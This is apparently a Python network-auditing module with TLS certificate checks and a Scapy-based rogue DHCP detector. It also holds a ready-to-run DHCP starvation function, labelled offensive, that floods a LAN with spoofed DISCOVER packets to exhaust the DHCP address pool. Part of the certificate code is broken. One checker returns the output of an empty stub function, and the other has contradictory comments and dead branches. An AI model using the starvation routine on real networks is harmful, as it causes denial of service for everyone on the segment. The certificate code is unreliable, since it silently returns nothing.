"""
Argos — Security Audit Module
Specialized module for passive and active auditing of critical 
network configurations (Rogue DHCP detection, SSL Certificate validation).
"""

import socket
import ssl
import time
from typing import Dict, List, Optional, Callable


def ssl_cert_check(dst_ip: str, port: int = 443, timeout: float = 3.0, log_callback: Optional[Callable] = None) -> Dict:
    """
    Obtains the SSL/TLS certificate of a service and validates its expiration
    and basic parameters for security audits.
    """
    def _log(msg):
        if log_callback:
            log_callback(msg)

    _log(f"[AUDIT] SSL Check → {dst_ip}:{port}")
    
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE  # We want the cert even if we don't trust the local CA

    result = {
        "status": "error",
        "issuer": "N/A",
        "subject": "N/A",
        "expired": False,
        "days_left": 0,
        "version": "N/A"
    }

    try:
        with socket.create_connection((dst_ip, port), timeout=timeout) as sock:
            with context.wrap_socket(sock, server_hostname=dst_ip) as ssock:
                cert = ssock.getpeercert(binary_form=True)
                # We extract info with the cryptography module if present, otherwise we parse native.
                # We'll use limited native methods first.
                # getpeercert without binary_form only returns info if validated, so we use pyOpenSSL
                # or load the DER manually. To avoid dependence on PyOpenSSL:
                return _parse_cert_basic(ssock.getpeercert(), ssock.version())
    except Exception as e:
        _log(f"[AUDIT] Error SSL/TLS: {e}")
        return result


def _parse_cert_basic(cert_dict: Optional[Dict], ssl_version: str) -> Dict:
    """
    Attempts to extract info if validation was at least partial.
    Requires verify_mode != CERT_NONE but that breaks self-signed certs.
    If CERT_NONE is used, ssl.getpeercert() returns {} in standard Python.
    To solve this, we use a trick with sockets.
    """
    pass


def ssl_cert_check_advanced(dst_ip: str, port: int = 443, timeout: float = 3.0, log_callback: Optional[Callable] = None) -> Dict:
    """Version that extracts dates manually using ssl and sockets."""
    import datetime

    def _log(msg):
        if log_callback:
            log_callback(msg)

    _log(f"[AUDIT] SSL Cert Check → {dst_ip}:{port}")
    
    result = {
        "status": "unknown",
        "issuer": "N/A",
        "subject": "N/A",
        "valid_from": "N/A",
        "valid_to": "N/A",
        "days_left": 0,
        "expired": False,
        "version": "N/A"
    }

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_REQUIRED
    # Trick: ignore errors to force cert dict loading
    
    try:
        # Usamos el modo normal primero
        with socket.create_connection((dst_ip, port), timeout=timeout) as sock:
            with context.wrap_socket(sock, server_hostname=dst_ip) as ssock:
                der = ssock.getpeercert(binary_form=False)
    except ssl.SSLCertVerificationError as e:
        # Failed because it's self-signed, but the exception object has access to the cert
        der = e.verify_message # Not always useful
    except ssl.SSLError:
        context.verify_mode = ssl.CERT_NONE
        try:
             with socket.create_connection((dst_ip, port), timeout=timeout) as sock:
                with context.wrap_socket(sock, server_hostname=dst_ip) as ssock:
                    der = ssock.getpeercert(binary_form=False) # returns empty dict with CERT_NONE
        except Exception:
            return result
    except Exception as e:
        _log(f"[AUDIT] Socket Error: {e}")
        return result

    # We'll use the correct mode for Python >= 3.2 which is getpeercert without binary
    # Requires verify_mode = CERT_OPTIONAL
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_OPTIONAL

    try:
        with socket.create_connection((dst_ip, port), timeout=timeout) as sock:
            with context.wrap_socket(sock, server_hostname=dst_ip) as ssock:
                cert = ssock.getpeercert()
                result["version"] = ssock.version()
                result["status"] = "ok"
                
                if cert:
                    if 'issuer' in cert:
                        iss = [v[0][1] for v in cert['issuer'] if v[0][0] in ('organizationName', 'commonName')]
                        result["issuer"] = " / ".join(iss) if iss else "Unknown"
                    
                    if 'subject' in cert:
                        sub = [v[0][1] for v in cert['subject'] if v[0][0] in ('organizationName', 'commonName')]
                        result["subject"] = " / ".join(sub) if sub else "Unknown"

                    if 'notAfter' in cert:
                        # Format: 'Jan 22 12:00:00 2025 GMT'
                        expire_date = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        result["valid_to"] = expire_date.strftime('%Y-%m-%d')
                        delta = expire_date - datetime.datetime.now()
                        result["days_left"] = delta.days
                        result["expired"] = delta.days < 0

    except Exception as e:
        _log(f"[AUDIT] Error reading SSL certificate: {e}")
        result["status"] = "error"

    return result


def dhcp_rogue_scan(legit_dhcp_ip: str = "", timeout: int = 10, log_callback: Optional[Callable] = None) -> List[Dict]:
    """
    Simulates a DHCP DISCOVER request to detect unauthorized DHCP servers.
    This is an active Layer 2/3 scan (requires root/admin privileges and Scapy).
    """
    def _log(msg):
        if log_callback:
            log_callback(msg)

    _log(f"[AUDIT] Starting DHCP Rogue Scan (Timeout: {timeout}s)")
    rogues = []
    
    try:
        from scapy.all import Ether, IP, UDP, BOOTP, DHCP, srp, conf, get_if_raw_hwaddr, get_if_hwaddr

        conf.verb = 0
        from scapy.all import conf as scapy_conf
        
        # MAC of the active interface
        try:
            hw = get_if_raw_hwaddr(scapy_conf.iface)[1]
            mac_str = get_if_hwaddr(scapy_conf.iface)
        except Exception:
            _log("[AUDIT] Error obtaining interface MAC. DHCP test cancelled.")
            return []

        # Create DHCP Discover packet
        dhcp_discover = (
            Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=hw) /
            DHCP(options=[("message-type", "discover"), "end"])
        )

        _log("[AUDIT] Sending DHCP Discover...")
        
        # Send packet and listen for responses
        try:
            answered, _ = srp(dhcp_discover, multi=True, timeout=timeout, verbose=False)
        except Exception as e:
            msg = str(e).lower()
            if (
                "winpcap is not installed" in msg
                or "npcap" in msg
                or "not available at layer 2" in msg
                or ("layer 2" in msg and "pcap" in msg)
            ):
                _log(
                    "[AUDIT] Layer 2 not available (Npcap/WinPcap missing). "
                    "Install Npcap (WinPcap compatible) and run as Administrator."
                )
                return []
            raise

        for sent, received in answered:
            if received.haslayer(DHCP):
                dhcp_options = received[DHCP].options
                dhcp_server_ip = received[IP].src
                offer_ip = received[BOOTP].yiaddr
                mac_server = received[Ether].src

                msg_type = ""
                domain = ""
                for opt in dhcp_options:
                    if isinstance(opt, tuple):
                        if opt[0] == "message-type":
                            msg_type = {1: "discover", 2: "offer", 3: "request", 5: "ack"}.get(opt[1], str(opt[1]))
                        elif opt[0] == "domain":
                            domain = opt[1].decode('utf-8', errors='ignore') if isinstance(opt[1], bytes) else opt[1]

                if msg_type == "offer":
                    is_rogue = False
                    if legit_dhcp_ip and dhcp_server_ip != legit_dhcp_ip:
                        is_rogue = True
                        _log(f"[AUDIT] 🚨 ALERT: Rogue DHCP Detected -> {dhcp_server_ip} (Offers IP: {offer_ip})")
                    else:
                        _log(f"[AUDIT] Valid DHCP Offer from -> {dhcp_server_ip} (Offers IP: {offer_ip})")

                    rogues.append({
                        "dhcp_server_ip": dhcp_server_ip,
                        "server_mac": mac_server.upper(),
                        "offered_ip": offer_ip,
                        "domain": domain,
                        "is_rogue": is_rogue
                    })

    except Exception as e:
        _log(f"[AUDIT] DHCP Scan error: {e}")

    _log(f"[AUDIT] DHCP Analysis finished. {len(rogues)} offering servers found.")
    return rogues


def dhcp_starvation(
    count: int = 200,
    timeout: int = 1,
    log_callback: Optional[Callable] = None,
    progress_callback: Optional[Callable] = None
) -> Dict:
    """
    OFFENSIVE: DHCP Starvation Attack.
    Floods the local network with DHCP DISCOVER packets using random MACs
    to exhaust the DHCP server's available IP pool.

    WARNING: This is a Layer 2 DoS attack. Use only in authorized lab environments.

    Args:
        count: Number of DHCP DISCOVER packets to send.
        timeout: Timeout between sends (in ms, ultra-fast).
        log_callback: Callback for logging.
        progress_callback: Callback(sent, total) for progress tracking.

    Returns:
        Dict with attack statistics.
    """
    def _log(msg):
        if log_callback:
            log_callback(msg)

    _log(f"[STARVATION] Initiating DHCP Starvation ({count} requests)...")

    stats = {"sent": 0, "offers_received": 0, "errors": 0}

    try:
        from scapy.all import (
            Ether, IP, UDP, BOOTP, DHCP, RandMAC,
            sendp, conf
        )
        conf.verb = 0

        for i in range(count):
            random_mac = str(RandMAC())
            # Convert MAC string to raw bytes for BOOTP chaddr
            mac_bytes = bytes.fromhex(random_mac.replace(":", ""))

            dhcp_discover = (
                Ether(src=random_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac_bytes, xid=i + 1) /
                DHCP(options=[("message-type", "discover"), "end"])
            )

            try:
                sendp(dhcp_discover, verbose=False)
                stats["sent"] += 1
            except Exception as e:
                stats["errors"] += 1
                if stats["errors"] <= 3:
                    _log(f"[STARVATION] Send error: {e}")

            if progress_callback:
                progress_callback(i + 1, count)

            time.sleep(timeout / 1000)

        _log(
            f"[STARVATION] Attack complete. "
            f"Sent: {stats['sent']}, Errors: {stats['errors']}"
        )

    except ImportError:
        _log("[STARVATION] Scapy is required for DHCP Starvation.")
        stats["errors"] = count
    except Exception as e:
        _log(f"[STARVATION] Fatal error: {e}")

    return stats
